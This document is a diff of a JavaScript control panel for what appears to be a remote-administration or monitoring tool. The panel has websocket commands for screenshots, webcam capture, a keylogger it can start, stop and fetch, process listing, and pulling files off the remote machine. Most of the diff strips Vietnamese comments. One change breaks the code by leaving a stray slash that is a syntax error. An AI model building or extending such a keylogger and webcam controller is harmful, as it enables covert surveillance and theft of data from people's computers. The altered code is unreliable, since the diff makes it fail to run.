@@ -2,7 +2,7 @@
 let websocket = null;
 let intervalUptime = null;
 let intervalSensors = null;
-let intervalPing = null; // Fix: Added missing variable
+let intervalPing = null; /
 let systemStartTime = 0; 
 let lastScreenshotUrl = null; 
 let lastWebcamUrl = null;
@@ -392,15 +392,8 @@ function handleIncomingMessage(data) {
         // Cấu trúc: FILE_DOWNLOAD | Tên File | Base64
         const parts = data.split("|");
 
-        // Kiểm tra xem có đủ 3 phần không
         if (parts.length >= 3) {
-            // parts[0] là "FILE_DOWNLOAD"
-            // parts[1] là Tên File (vd: "Báo Cáo (1).pdf") -> Lấy nguyên văn
             const filename = parts[1];
-            
-            // parts[2] là Base64. 
-            
-            // Tìm vị trí dấu | thứ nhất và thứ hai
             const firstPipe = data.indexOf("|");
             const secondPipe = data.indexOf("|", firstPipe + 1);
             
@@ -408,7 +401,6 @@ function handleIncomingMessage(data) {
                 const finalFilename = data.substring(firstPipe + 1, secondPipe);
                 const base64Content = data.substring(secondPipe + 1);
 
-                // Gọi hàm lưu
                 const isSaved = saveBase64ToDisk(finalFilename, base64Content);
                 
                 if (isSaved) {
@@ -507,13 +499,6 @@ function startKeylog() {
 
 function fetchKeylog() { sendCmd('get-keylog'); }
 
-// --- SỬA LỖI HISTORY KEYLOGGER ---
-// [FIX VẤN ĐỀ 3] LOGIC STOP & SAVE HISTORY
-// --- FIX DỨT ĐIỂM LỖI STOP KEYLOG 2 LẦN ---
-// --- FIX: STOP, FETCH & SAVE CẢ RAW + TEXT ---
-// --- 1. SỬA LẠI NÚT STOP (CHỈ STOP & SAVE, KHÔNG FETCH) ---
-// --- FIX: STOP & SAVE NGAY LẬP TỨC (KHÔNG FETCH) ---
-// --- FIX: QUY TRÌNH STOP & SAVE TỰ ĐỘNG ---
 function stopKeylog() {
     // 1. Bật cờ hiệu thông báo: "Tôi đang muốn dừng và lưu"
     isKeylogStopping = true;
@@ -943,7 +928,6 @@ function renderProcessTable(d, id) {
     // Dữ liệu Server trả về theo thứ tự: PID [0] | RAM [1] | Threads [2] | Name [3]
     const lines = d.trim().split('\n');
     
-    // Bỏ dòng đầu tiên (Header của Server gửi về)
     lines.slice(1).forEach(r => {
         const c = r.split('\t');
         if (c.length >= 4) {
@@ -1014,8 +998,6 @@ function requestDownloadFile() {
 
 function saveBase64ToDisk(filename, base64) {
     try {
-        // [QUAN TRỌNG] Lọc bỏ các ký tự lạ (như \0, \n) làm hỏng Base64
-        // Chỉ giữ lại các ký tự Base64 chuẩn (A-Z, a-z, 0-9, +, /, =)
         const cleanBase64 = base64.replace(/[^A-Za-z0-9+/=]/g, "");
 
         const binaryString = atob(cleanBase64);
@@ -1054,11 +1036,11 @@ function saveBase64ToDisk(filename, base64) {
             if(typeof lucide !== 'undefined') lucide.createIcons();
         }
         
-        return true; // Trả về true để báo thành công
+        return true; 
 
     } catch (e) {
         console.error("File Save Error:", e);
         showToast("Error saving file (Invalid Base64)", "error");
-        return false; // Trả về false để báo thất bại
+        return false; 
     }
 }
